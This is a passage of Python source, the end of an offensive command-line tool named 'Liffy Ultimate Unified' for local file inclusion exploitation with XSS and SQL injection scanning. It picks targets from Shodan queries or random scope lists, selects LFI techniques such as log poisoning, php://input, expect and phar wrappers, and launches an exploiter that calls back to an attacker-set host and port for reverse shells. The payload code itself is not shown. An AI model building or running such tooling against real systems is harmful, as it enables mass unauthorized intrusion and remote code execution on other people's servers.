            for vuln in sqli_vulns[:5]:  # Show first 5
                self.ui.info(f"  {vuln.url}")
    
    def _offer_lfi_exploitation(self, lfi_targets: List[URLInfo]):
        """Offer to exploit LFI targets"""
        if not lfi_targets:
            return
        
        self.ui.info(f"\n{t.green('LFI Exploitation Options:')}")
        for i, target in enumerate(lfi_targets[:5]):  # Show first 5
            self.ui.info(f"  {i+1}. {target.url}")
        
        try:
            choice = input(f"\nSelect target for LFI exploitation (1-{min(5, len(lfi_targets))}) or press Enter to skip: ")
            if choice.strip():
                target_index = int(choice) - 1
                if 0 <= target_index < min(5, len(lfi_targets)):
                    selected_target = lfi_targets[target_index]
                    
                    # Update config with selected target
                    self.config.target_url = selected_target.url
                    
                    # Auto-detect lhost and lport
                    lhost, lport = LiffyValidator.validate_auto_detection(self.config)
                    if lhost and lport:
                        self.config.lhost = lhost
                        self.config.lport = lport
                        
                        # Run LFI exploitation
                        exploiter = LiffyExploiter(self.config, self.logger, self.ui)
                        if exploiter.check_target():
                            exploiter.execute_technique()
                        else:
                            self.ui.error("Target validation failed")
                    else:
                        self.ui.error("Could not determine lhost/lport")
        except (ValueError, KeyboardInterrupt):
            self.ui.info("LFI exploitation skipped")

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Liffy Ultimate Unified - Complete LFI Exploitation & Vulnerability Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target LFI exploitation
  %(prog)s --url http://target/file.php?page= --data --lhost 192.168.1.100 --lport 4444
  
  # Random targets from scope
  %(prog)s --random --test-mode all
  
  # Specific domain testing
  %(prog)s --domain example.com --test-mode lfi
  
  # Shodan search with LFI testing
  %(prog)s --shodan-query "apache" --test-mode lfi --auto-ip --auto-port
  
  # XSS testing only
  %(prog)s --domain example.com --test-mode xss
  
  # SQL injection testing only
  %(prog)s --domain example.com --test-mode sqli
        """
    )
    
    # Target selection (mutually exclusive)
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument("--url", help="Target URL with LFI parameter (single target mode)")
    target_group.add_argument("--domain", help="Target domain for testing (multi-target mode)")
    target_group.add_argument("--shodan-query", help="Shodan query for target discovery")
    target_group.add_argument("--random", action="store_true", help="Use random targets from ~/targets/scope")
    
    # Random target options
    parser.add_argument("--random-count", type=int, default=5, help="Number of random targets to select")
    
    # Shodan options
    parser.add_argument("--country", help="Filter by country code")
    parser.add_argument("--asn", help="Filter by ASN")
    parser.add_argument("--ports", help="Target specific ports")
    
    # General options
    parser.add_argument("--limit", type=int, default=100, help="Limit number of results")
    parser.add_argument("--test-mode", choices=['lfi', 'xss', 'sqli', 'all'], default='all',
                       help="Type of testing to perform")
    
    # LFI technique selection
    parser.add_argument("--technique", choices=['data', 'input', 'expect', 'environ', 'access', 'ssh', 'filter', 'zip', 'phar', 'compress', 'auto'],
                       default='auto', help="LFI technique to use")
    
    # Payload options
    parser.add_argument("--lhost", help="Callback host for reverse shells")
    parser.add_argument("--lport", type=int, help="Callback port for reverse shells")
    parser.add_argument("--auto-ip", action="store_true", help="Auto-detect IP address")
    parser.add_argument("--auto-port", action="store_true", help="Auto-detect available port")
    parser.add_argument("--nostager", action="store_true", help="Execute payload directly without stager")
    parser.add_argument("--payload", help="Custom payload file path")
    
    # Log poisoning options
    parser.add_argument("--location", help="Path to log file (access.log, auth.log, etc.)")
    parser.add_argument("--relative", action="store_true", help="Use path traversal sequences")
    
    # Request options
    parser.add_argument("--cookies", help="Session cookies")
    parser.add_argument("--user-agent", help="Custom User-Agent string")
    parser.add_argument("--proxy", help="HTTP proxy (http://proxy:port)")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds")
    
    # Output options
    parser.add_argument("--output", "-o", help="Output file for results")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--max-workers", type=int, default=10, help="Maximum number of concurrent workers")
    
    # Tool options
    parser.add_argument("--no-airixss", action="store_true", help="Disable airixss XSS testing")
    parser.add_argument("--no-jeeves", action="store_true", help="Disable jeeves SQLi testing")
    parser.add_argument("--no-sqry", action="store_true", help="Disable sqry Shodan search")
    parser.add_argument("--no-gauplus", action="store_true", help="Disable gauplus historical search")
    
    return parser.parse_args()

def main():
    """Main function"""
    try:
        # Parse arguments
        args = parse_arguments()
        
        # Create configuration
        config = LiffyConfig(
            target_url=args.url,
            domain=args.domain,
            shodan_query=args.shodan_query,
            random_targets=args.random,
            random_count=args.random_count,
            limit=args.limit,
            country=args.country,
            asn=args.asn,
            ports=args.ports,
            technique=Technique(args.technique),
            test_mode=TestMode(args.test_mode),
            lhost=args.lhost,
            lport=args.lport,
            auto_ip=args.auto_ip,
            auto_port=args.auto_port,
            nostager=args.nostager,
            payload=args.payload,
            location=args.location,
            relative=args.relative,
            cookies=args.cookies,
            user_agent=args.user_agent,
            proxy=args.proxy,
            timeout=args.timeout,
            verbose=args.verbose,
            output_file=args.output,
            max_workers=args.max_workers,
            use_airixss=not args.no_airixss,
            use_jeeves=not args.no_jeeves,
            use_sqry=not args.no_sqry,
            use_gauplus=not args.no_gauplus
        )
        
        # Create and run unified tool
        liffy = LiffyUltimateUnified(config)
        liffy.run()
        
    except KeyboardInterrupt:
        print(t.red(f"\n[{datetime.datetime.now()}] Keyboard interrupt received"))
        sys.exit(0)
    except Exception as e:
        print(t.red(f"\n[{datetime.datetime.now()}] Unexpected error: {str(e)}"))
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
